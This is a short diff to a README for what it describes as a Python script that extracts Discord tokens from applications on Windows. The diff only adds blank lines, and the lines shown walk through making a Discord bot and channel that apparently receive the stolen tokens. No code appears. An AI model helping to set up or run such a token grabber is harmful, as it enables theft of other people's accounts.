@@ -46,7 +46,9 @@ This Python script extracts Discord tokens from various applications on a Window
    3.4 Once the bot is created, you will receive a Bot Token. Save this token for later use.
 
    3.5 Example Token: `12345`
+
    **Step 2: Get Your Channel ID**
+
    3.6 Add your bot to the target channel as an administrator.
 
    3.7 Swap `<YOUR_BOT_TOKEN>` with your bot token in this URL:  
